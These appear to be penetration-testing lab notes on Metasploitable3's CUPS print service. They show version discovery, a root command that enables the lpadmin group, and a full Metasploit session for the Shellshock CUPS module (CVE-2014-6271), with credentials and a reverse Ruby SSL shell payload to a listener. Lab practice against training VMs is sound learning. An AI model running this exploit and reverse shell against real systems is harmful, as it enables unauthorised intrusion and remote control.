### metasploitable feature

631 open in your priv-esc enumeration when you run netstat

You can log in to it here: http://localhost:631/admin

You authenticate with the OS-users.

Find version. Test cups-config --version. If this does not work surf to http://localhost:631/printers and see the CUPS version in the title bar of your browser.
There are vulnerabilities for it so check your searchsploit.

---------------------------------

The CUPS application running on the system has a remote code execution vulnerability which can be exploited using the CUPS Filter Bash Environment Variable Code Injection (Shellshock) module.

Note that there is currently a configuration issue due to which this exploit does not work on a default configuration. You will need to add the vagrant user to the lpadmin group to get this to work by running the below command as root on the Metasploitable box first.

root@metasploitable3-ub1404:/home/vagrant# usermod -a -G lpadmin vagrant

msf5 > use exploit/multi/http/cups_bash_env_exec

msf5 exploit(multi/http/cups_bash_env_exec) > show options

Module options (exploit/multi/http/cups_bash_env_exec):

   Name          Current Setting  Required  Description
   
   ----          ---------------  --------  -----------
   
   CVE           CVE-2014-6271    yes       CVE to exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   
   HttpPassword  vagrant          yes       CUPS user password
   
   HttpUsername  vagrant          yes       CUPS username
   
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   
   RHOSTS        10.0.2.15        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   
   RPATH         /bin             yes       Target PATH for binaries
   
   RPORT         631              yes       The target port (TCP)
   
   SSL           true             yes       Use SSL
   
   VHOST                          no        HTTP server virtual host
   
Payload options (cmd/unix/reverse_ruby_ssl):

   Name   Current Setting  Required  Description
   
   ----   ---------------  --------  -----------
   
   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
   
   LPORT  4444             yes       The listen port
   
Exploit target:

   Id  Name
   
   --  ----
   
   0   Automatic Targeting
   
msf5 exploit(multi/http/cups_bash_env_exec) > run
